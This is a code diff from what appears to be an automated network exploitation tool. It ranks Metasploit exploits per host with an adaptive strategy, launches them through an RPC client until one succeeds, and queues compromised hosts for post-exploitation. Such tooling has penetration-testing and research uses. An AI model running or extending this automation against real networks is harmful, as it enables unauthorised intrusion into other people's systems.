@@ -32,9 +32,9 @@ def main():
     exploitQueue = []
     postexQueue = []
 
-    strategy = Selector.Default_Strategy(Exploiter.getExploitNames())
+    strategy = Selector.defaultStrategy(Exploiter.getExploitNames())
 
-    log_file = open("ophio_log.txt", 'a')
+    log_file = open("ophio_log.txt", 'a') # TODO proper logging library, use throughout
 
 
 
@@ -71,6 +71,7 @@ def main():
         enrichQueue.append(hostRecord)
 
 
+
     ### enricher
     # call scanHostsForInfo on list of hosts, excluding self
     # log results of scans
@@ -94,18 +95,28 @@ def main():
 
     while len(exploitQueue) > 0:
         hostRecord = exploitQueue.pop()
-        hostData = [hostRecord.os,
-        exploitResults = Selector.selectExploit(strategy, msfClient, hostData) # might be simpler to pull that functionality here
-        if exploitResults = None:
-            hostRecord.exploitStatus["statusCode"] = 2
+        hostIp = hostRecord.interfaces[0]
+        hostData = [hostRecord.os, hostRecord.openPorts]
+        exploitOrder = strategy.search(hostData)
+
+        for exploit in exploitOrder:
+            exploitResults = Exploiter.callExploit(msfClient, exploit, hostIp)
+            exploitSuccess = exploitResults["job_id"] != None
+            strategy.update(hostData, exploit, exploitSuccess)
+            if exploitSuccess:
+                break
+
+        if exploitResults["job_id"] == None:
+            hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
         else:
             hostRecord.exploitStatus = {
-                "statusCode": 1,
-                "exploitUsed": exploitResults["uuid"], # gotta grab this somehow
-                "msSessionId": exploitResults["jobid"]
+                "statusCode": Record.STATUS_SUCCESS,
+                "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
+                "msSessionId": exploitResults["job_id"]
             }
         # TODO update hostRecord in netMapTable
         postexQueue.append(hostRecord)
+
 
 
     ### post-exploits
